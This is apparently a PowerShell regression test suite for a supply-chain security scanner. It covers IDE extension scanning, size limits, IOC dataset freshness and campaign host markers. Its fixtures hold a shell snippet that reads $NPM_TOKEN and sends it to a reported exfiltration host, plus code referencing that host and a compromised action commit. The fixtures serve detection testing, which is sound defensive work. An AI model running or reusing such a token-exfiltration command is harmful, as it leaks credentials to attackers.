Assert-Update ([string]::IsNullOrEmpty((Get-RuntimeTransferAssessment ('echo "BASH_ENV=normal"; '+$transferCommand+' https://example.invalid/health') shell $true).ciTransfer)) 'Normal CI bridge promoted'
Assert-Update ([string]::IsNullOrEmpty((Get-RuntimeTransferAssessment ('read(){ token="$NPM_TOKEN"; } send(){ '+$transferCommand+' --data "$token" "https://storage.skyleen.fr/upload"; }') shell $true).ciTransfer)) 'Separate shell functions were correlated'
Complete-Case T14; Complete-Case T15; Complete-Case T19; Complete-Case T36

$ideRoot=Join-Path $artifactRoot 'ide'
New-JsonFixture (Join-Path $ideRoot '.vscode/extensions/theme-one/package.json') @{publisher='microsoftvs';name='microsoftvs';version='1.0.0'}
Write-NewFixture (Join-Path $ideRoot '.vscode/extensions/theme-one/out/extension.js') 'console.log("inert theme");'
New-JsonFixture (Join-Path $ideRoot '.vscode/extensions/theme-two/package.json') @{publisher='cosmic-themes';name='theme-cosmic-nebula';version='1.0.0'}
Write-NewFixture (Join-Path $ideRoot '.vscode/extensions/theme-two/app.js') 'console.log("inert theme");'
New-JsonFixture (Join-Path $ideRoot '.vscode/extensions/metadata-only/package.json') @{publisher='synthetic';name='metadata-only';version='1.0.0';main='./extension.js'}
$ide=Invoke-UpdateScan ide $ideRoot IdeExtensions
Assert-Update (@(Find-Update $ide IDE_EXTENSION_ID_WATCHLIST | Where-Object {$_.severity -eq 'INFO'}).Count -eq 2 -and $ide.scanStats.fileHashComputations -eq 2) 'IDE metadata/payload selection contract'
Assert-Update ($ide.scanComplete) 'Metadata-only extension was made incomplete without a required incident artifact'
$archive=Join-Path $artifactRoot 'explicit-theme.vsix'
Write-NewFixture $archive 'inert archive bytes'
$archiveReport=Invoke-UpdateScan archive $archive IdeExtensions
Assert-Update ($archiveReport.scanStats.fileHashComputations -eq 1) 'Explicit VSIX not hashed by IDE check'
Complete-Case T22

$limitsRoot=Join-Path $artifactRoot 'limits'
New-JsonFixture (Join-Path $limitsRoot 'node_modules/oversize/package.json') @{name='synthetic-large';version='1.0.0'}
Write-NewFixture (Join-Path $limitsRoot 'node_modules/oversize/.sckit/windows-amd64/sckit.exe') ('X'*1048577)
$limitedMetadata=Join-Path $limitsRoot '.venv/Lib/site-packages/MemoryOS.dist-info/METADATA'
Write-NewFixture $limitedMetadata ('Name: MemoryOS'+[char]10+'Version: 2.0.33'+[char]10+[char]10)
Write-NewFixture (Join-Path (Split-Path -Parent $limitedMetadata) 'RECORD') (('memos/log.py,,0'+[char]10)*10000)
$limits=Invoke-UpdateScan limits $limitsRoot Packages @('-MaxFileSizeMB','1')
Assert-Update (-not $limits.scanComplete -and @($limits.coverage.candidateFailures | Where-Object {$_.kind -eq 'incident-hash' -and $_.critical -and $_.failureType -eq 'too-large'}).Count -eq 1) 'Oversize binary lacks incomplete critical coverage'
Assert-Update (@($limits.coverage.candidateFailures | Where-Object {$_.failureType -eq 'selector-byte-limit' -and $_.critical}).Count -eq 1) 'Oversize RECORD lacks bounded incomplete critical coverage'
$budget=Invoke-UpdateScan budget $packageRoot Packages @('-MaxFiles','3')
Assert-Update ($budget.scanStats.uniqueFilesQueued -le 3 -and -not $budget.scanComplete) 'Unique run budget or incomplete status lost'
Complete-Case T24; Complete-Case T25

foreach ($report in @($packages,$python,$life,$ci,$ide,$archiveReport)) {
    $expectedCheck=$report.expandedChecks[0]
    Assert-Update (@($report.findings | Where-Object {$_.sourceId -match '^S[0-9]{2}$' -and $_.check -ne $expectedCheck}).Count -eq 0) 'Single-check source finding crossed ownership boundary'
}
Complete-Case T31
Assert-Update ($packages.iocData.missingCount -eq 0 -and $packages.iocData.invalidCount -eq 0 -and @($packages.iocData.datasets).Count -eq 6) 'Shipped bounded IOC datasets are missing/invalid (NodeRuntime is not selected in this run)'
foreach ($dataset in $packages.iocData.datasets) {
    $reviewDate=[DateTime]::ParseExact([string]$dataset.lastUpdated,'yyyy-MM-dd',[Globalization.CultureInfo]::InvariantCulture)
    $expectedStatus=if ($reviewDate.AddDays([int]$dataset.expiresAfterDays) -lt (Get-Date)) {'stale'} else {'current'}
    Assert-Update ($dataset.status -eq $expectedStatus) 'Dataset freshness does not follow its reviewed date and unchanged expiry period'
}
Assert-Update ($packages.iocData.releaseReady -eq ($packages.iocData.staleCount -eq 0)) 'Publication gate disagrees with dataset freshness'
$node=[IO.File]::ReadAllText((Join-Path $repoRoot 'iocs/known-node-runtimes.json')) | ConvertFrom-Json
$campaign=[IO.File]::ReadAllText((Join-Path $repoRoot 'iocs/campaign-keyv-chaindrop-20260806.json')) | ConvertFrom-Json
Assert-Update ((Get-CampaignIocCanonicalHash $campaign.packages) -eq '7da86fddcb4bc5c4352d3f2120903a07314ae2ce3071d980061862bcbc8aa497') 'Keyv snapshot digest drift'
Assert-Update ($node.lastUpdated -eq '2026-10-06' -and $campaign.lastReviewed -eq '2026-10-06' -and $node.expiresAfterDays -eq 30 -and $campaign.reviewAfterDays -eq 30) 'Reviewed Node/Keyv metadata or expiry contract drift'
Complete-Case T28
Reset-HelperContext
$script:Context.iocs=@{packages=New-ArrayList;files=New-ArrayList;extensions=New-ArrayList;patterns=New-ArrayList;actions=New-ArrayList;actionAdvisories=@($delta.advisories);domains=New-ArrayList;ips=New-ArrayList}
$localRoot=Join-Path $artifactRoot 'invalid-ioc'
$script:BaseDir=$localRoot
$invalid=@{schemaVersion='0.1.23';lastUpdated=(Get-Date).ToString('yyyy-MM-dd');sourceSet='synthetic';expiresAfterDays=30;advisories=@(@{id='bad'});actions=@($delta.actions)}
New-JsonFixture (Join-Path $localRoot 'iocs/known-actions.json') $invalid
Load-LocalIocs
Assert-Update ($script:Context.iocDataSets['known-actions.json'].status -eq 'invalid' -and $script:Context.iocs.actions.Count -eq 1 -and $script:Context.iocs.actionAdvisories.Count -eq 1) 'Invalid advisory body lost history/fallback or was overwritten by fresh header'
Assert-Update (-not (Get-IocDataSummary).releaseReady -and (Get-IocDataSummary).missingCount -eq 4) 'Missing/invalid dataset release gate lost'
Complete-Case T26; Complete-Case T27; Complete-Case T34
$oldRoot=Join-Path $artifactRoot 'old-schema-ioc'
$script:BaseDir=$oldRoot
New-JsonFixture (Join-Path $oldRoot 'iocs/known-actions.json') @{schemaVersion='0.1.22';lastUpdated=(Get-Date).ToString('yyyy-MM-dd');sourceSet='synthetic-old';expiresAfterDays=30;actions=@(@{repository='codfish/semantic-release-action';compromisedCommits=@('bcb6b1d409144318e8fad2171d6fe06d02299d1a');compromisedRefs=@('v2.2.1')})}
Load-LocalIocs
Assert-Update ($script:Context.iocDataSets['known-actions.json'].status -eq 'invalid' -and $script:Context.iocs.actions.Count -eq 2 -and $script:Context.iocs.actionAdvisories.Count -eq 1) 'Old schema lost historical actions or fallback'

$markerRoot=Join-Path $artifactRoot 'markers'
Write-NewFixture (Join-Path $markerRoot 'reported.js') 'const endpoint = "https://storage.skyleen.fr/upload";'
Write-NewFixture (Join-Path $markerRoot 'suffix.js') 'const endpoint = "https://skyleen.fr.evil.example/upload";'
Write-NewFixture (Join-Path $markerRoot 'README.md') 'Reported marker storage.skyleen.fr appears only in documentation.'
$markers=Invoke-UpdateScan markers $markerRoot ScannerSelf
Assert-Update (@(Find-Update $markers SUPPLYCHAIN_LOCAL_CAMPAIGN_HOST_MARKER 'reported.js' | Where-Object {$_.severity -eq 'WARN'}).Count -eq 1) 'Reported executable marker missed'
Assert-Update (@(Find-Update $markers SUPPLYCHAIN_LOCAL_CAMPAIGN_HOST_MARKER 'suffix.js').Count -eq 0 -and @(Find-Update $markers SUPPLYCHAIN_LOCAL_CAMPAIGN_HOST_MARKER 'README.md').Count -eq 0) 'Marker suffix/documentation false positive'
Complete-Case T35
$ciText=[IO.File]::ReadAllText((Join-Path $artifactRoot 'ci.txt'))
Assert-Update ($ciText -match 'sourceId: S10' -and $ciText -match 'upstreamSeverity: CRITICAL' -and $ciText -notmatch '\$NPM_TOKEN|storage\.skyleen\.fr') 'TXT provenance missing or raw credential/query data exposed'
$unique=@($ci.findings | ForEach-Object {$_.severity+'|'+$_.category+'|'+$_.path+'|'+$_.evidence} | Sort-Object -Unique)
Assert-Update ($unique.Count -eq @($ci.findings).Count) 'Report contains duplicate findings'
Complete-Case T30
# Established launcher, path-boundary and sample checks also run separately. Verify the fixture trust manifest here.
$manifest=[IO.File]::ReadAllText((Join-Path $repoRoot 'tests/samples/manifest.json')) | ConvertFrom-Json
Assert-Update ($null -ne $manifest) 'Sample trust manifest is not valid JSON'
Assert-Update (@($manifest.samples).Count -gt 0) 'Sample trust manifest is empty'
Complete-Case T29
Assert-Update ($passed.Count -eq 36) ('Incomplete test matrix: '+[string]::Join(',',[string[]]@(1..36 | ForEach-Object {'T{0:D2}' -f $_} | Where-Object {-not $passed.ContainsKey($_)})))
Write-NewFixture (Join-Path $artifactRoot 'result.json') (@{cases=@($passed.Keys | Sort-Object);assertions=$assertions;status='passed'} | ConvertTo-Json -Depth 4)
Write-Output ('Security update regressions passed: {0} cases, {1} assertions. Artifacts: {2}' -f $passed.Count,$assertions,$artifactRoot)
